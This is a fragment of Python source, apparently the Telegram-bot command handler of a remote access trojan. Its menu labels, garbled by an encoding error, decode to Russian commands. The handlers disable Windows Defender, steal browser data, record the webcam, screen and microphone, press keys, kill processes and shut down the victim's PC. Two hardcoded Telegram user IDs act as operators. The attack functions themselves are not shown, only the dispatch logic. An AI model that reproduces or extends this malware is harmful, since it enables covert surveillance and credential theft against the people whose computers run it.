    elif text == "üõ° –û—Ç–∫–ª—é—á–∏—Ç—å Defender":
        await disable_defender(user_id)
    elif text == "üåê –ë—Ä–∞—É–∑–µ—Ä—ã":
        await steal_browser_data(user_id)
    elif text == "üìä –ü—Ä–æ—Ü–µ—Å—Å—ã":
        current_process_page[user_id] = 0
        keyboard, message = await utils.create_processes_menu(user_id, current_process_page[user_id])
        await utils.send_message(user_id, message, reply_markup=keyboard)
    elif text == "üíÄ –ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å":
        await terminate_active_process(user_id)
    elif text == "üíÄ –ó–∞–≤–µ—Ä—à–∏—Ç—å –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å":
        awaiting_process_name[user_id] = True
        await utils.send_message(user_id, "üíÄ –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, notepad):")
    elif text == "‚å®Ô∏è –ù–∞–∂–∞—Ç—å –∫–æ–º–±–∏–Ω–∞—Ü–∏—é –∫–ª–∞–≤–∏—à":
        awaiting_key_combination[user_id] = True
        await utils.send_message(user_id, "‚å®Ô∏è –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏—é –∫–ª–∞–≤–∏—à (–Ω–∞–ø—Ä–∏–º–µ—Ä, alt + f4):")
    elif text == "‚¨áÔ∏è –°–≤–µ—Ä–Ω—É—Ç—å –æ–∫–Ω–æ":
        await minimize_window(user_id)
    elif text == "üì• –°–≤–µ—Ä–Ω—É—Ç—å –≤—Å–µ":
        await minimize_all_windows(user_id)
    elif text == "üñ± –î–µ—Ä–≥–∞—Ç—å –º—ã—à–∫–æ–π":
        await jiggle_mouse(user_id)
    elif text == "üîä –í–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫":
        await set_volume(user_id, mute=False)
    elif text == "üîá –í—ã–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫":
        await set_volume(user_id, mute=True)
    elif text == "üîå –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö":
        await shutdown_pc(user_id)
    elif text == "üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö":
        await reboot_pc(user_id)
    elif text == "üîô –ù–∞–∑–∞–¥":
        await utils.send_message(user_id, "üì± –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", reply_markup=utils.create_device_menu(DEVICE_NAME))
    elif text == "‚¨ÖÔ∏è –ù–∞–∑–∞–¥":
        current_process_page[user_id] = max(0, current_process_page[user_id] - 1)
        keyboard, message = await utils.create_processes_menu(user_id, current_process_page[user_id])
        await utils.send_message(user_id, message, reply_markup=keyboard)
    elif text == "‚û°Ô∏è –í–ø–µ—Ä–µ–¥":
        current_process_page[user_id] += 1
        keyboard, message = await utils.create_processes_menu(user_id, current_process_page[user_id])
        await utils.send_message(user_id, message, reply_markup=keyboard)
    elif user_id in awaiting_duration:
        if text.isdigit():
            seconds = int(text)
            if 5 <= seconds <= 30:
                if awaiting_duration[user_id] == "video":
                    await record_video(user_id, seconds)
                elif awaiting_duration[user_id] == "webcam_video":
                    await record_webcam_video(user_id, seconds)
                elif awaiting_duration[user_id] == "audio":
                    await record_audio(user_id, seconds)
                del awaiting_duration[user_id]
            else:
                await utils.send_message(user_id, "‚ùå –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç 5 –¥–æ 30!")
        else:
            await utils.send_message(user_id, "‚ùå –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ!")
    elif user_id in awaiting_messagebox:
        if isinstance(awaiting_messagebox[user_id], str):
            awaiting_messagebox[user_id] = (awaiting_messagebox[user_id], text)
            await utils.send_message(user_id, f"üí¨ –í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ '{text}':")
        elif isinstance(awaiting_messagebox[user_id], tuple):
            style, title = awaiting_messagebox[user_id]
            content = text
            await display_message(user_id, title, content, style)
            del awaiting_messagebox[user_id]
    elif user_id in awaiting_process_name:
        process_name = text
        await terminate_process_by_name(user_id, process_name)
        del awaiting_process_name[user_id]
    elif user_id in awaiting_key_combination:
        keys = text
        await press_key_combination(user_id, keys)
        del awaiting_key_combination[user_id]
    else:
        await utils.send_message(user_id, "‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞")

def initialize(modules_dict, states, device_name):
    global modules, current_process_page, awaiting_duration, awaiting_messagebox
    global awaiting_process_name, awaiting_key_combination, DEVICE_NAME, ALLOWED_USER_IDS
    
    modules = modules_dict
    current_process_page = states['current_process_page']
    awaiting_duration = states['awaiting_duration']
    awaiting_messagebox = states['awaiting_messagebox']
    awaiting_process_name = states['awaiting_process_name']
    awaiting_key_combination = states['awaiting_key_combination']
    DEVICE_NAME = device_name
    ALLOWED_USER_IDS = [6710064443, 2127575985]
